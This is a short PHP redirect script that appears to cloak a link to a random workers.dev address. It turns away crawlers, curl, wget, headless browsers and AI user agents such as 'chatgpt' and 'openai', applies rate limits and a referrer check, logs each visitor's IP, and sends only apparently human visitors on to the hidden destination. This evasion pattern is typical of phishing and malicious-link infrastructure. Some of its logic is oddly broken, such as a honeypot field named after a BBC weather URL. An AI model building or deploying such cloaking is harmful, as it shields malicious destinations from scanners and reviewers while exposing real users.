<?php
// Configuration
$redirectUrl = "https://707e3565.45dea72c27a70fa75e4d6281.workers.dev"; 
$allowedReferrer = "https://707e3565.45dea72c27a70fa75e4d6281.workers.dev"; // Allowed referrer domain
$logFile = "redirect_log.txt"; // Log file to track redirects
$rateLimitFile = "rate_limit.txt"; // File to store IP rate limits
$rateLimit = 3; // Max requests per IP in 1 hour
$honeypotField = "https://www.bbc.co.uk/weather"; 

// Advanced Bot Detection
function isBot() {
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
    $botKeywords = [
        'bot', 'crawl', 'spider', 'slurp', 'search', 'curl', 'wget', 'python', 'php',
        'headless', 'chrome-headless', 'phantomjs', 'selenium', 'playwright', 'puppeteer',
        'chatgpt', 'openai', 'gpt-3', 'gpt-4', 'ai', 'machine learning'
    ];

    // Check for bot keywords in user agent
    foreach ($botKeywords as $keyword) {
        if (strpos($userAgent, $keyword) !== false) {
            return true; // Likely a bot
        }
    }

    // Check for missing or suspicious user agent
    if (empty($userAgent) || strlen($userAgent) < 10) {
        return true; // Likely a bot
    }

    return false; // Not a bot
}

// Honeypot Trap
function isHoneypotTriggered($honeypotField) {
    return !empty($_POST[$honeypotField]); // Bots often fill hidden fields
}

// IP Rate Limiting
function isRateLimited($ip, $rateLimitFile, $rateLimit) {
    $rateData = [];
    if (file_exists($rateLimitFile)) {
        $rateData = json_decode(file_get_contents($rateLimitFile), true);
    }

    $currentTime = time();
    $requestCount = 0;

    // Remove old entries
    foreach ($rateData as $timestamp => $ips) {
        if ($currentTime - $timestamp > 3600) { // 1 hour window
            unset($rateData[$timestamp]);
        } else {
            $requestCount += $ips[$ip] ?? 0;
        }
    }

    // Check if the IP has exceeded the rate limit
    if ($requestCount >= $rateLimit) {
        return true; // Rate limit exceeded
    }

    // Log the current request
    $rateData[$currentTime][$ip] = ($rateData[$currentTime][$ip] ?? 0) + 1;
    file_put_contents($rateLimitFile, json_encode($rateData));

    return false; // Within rate limit
}

// Referrer Validation
function isValidReferrer($allowedReferrer) {
    $referrer = $_SERVER['HTTP_REFERER'] ?? '';
    return strpos($referrer, $allowedReferrer) === 0; // Check if referrer matches
}

// Log Request
function logRequest($logFile, $ip, $userAgent, $referrer, $status) {
    $logEntry = date('Y-m-d H:i:s') . " - IP: $ip, User Agent: $userAgent, Referrer: $referrer, Status: $status\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND);
}

// Main Logic
$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$referrer = $_SERVER['HTTP_REFERER'] ?? 'Unknown';

// Check for bots, honeypot triggers, rate limits, and valid referrer
if (isBot() || isHoneypotTriggered($honeypotField) || isRateLimited($ip, $rateLimitFile, $rateLimit) || !isValidReferrer($allowedReferrer)) {
    // Block bots, honeypot triggers, rate-limited IPs, and invalid referrers
    logRequest($logFile, $ip, $userAgent, $referrer, "Blocked");
    header("HTTP/1.1 403 Forbidden");
    echo "Access denied.";
    exit();
} else {
    // Log the redirect
    logRequest($logFile, $ip, $userAgent, $referrer, "Redirected");

    // Add a small delay to prevent rapid requests
    sleep(1);

    // Perform the redirect
    header("Location: $redirectUrl", true, 302);
    exit();
}
?>
